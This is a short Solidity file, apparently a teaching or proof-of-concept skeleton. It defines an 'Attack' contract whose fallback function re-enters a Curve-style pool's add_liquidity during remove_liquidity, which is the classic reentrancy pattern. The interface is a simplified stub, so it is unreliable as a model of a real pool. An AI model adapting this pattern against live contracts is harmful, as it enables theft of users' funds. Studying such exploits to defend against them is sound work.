// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.2 <0.9.0;

interface CurveContract {
    function add_liquidity() external;
    function remove_liquidity() external;
}

contract Attack {
    CurveContract public curve;

    constructor(address _curveContract) {
        curve = CurveContract(_curveContract);
    }

    function attack() external payable {
        curve.remove_liquidity();
    }

    fallback() external {
        curve.add_liquidity();
    }
}
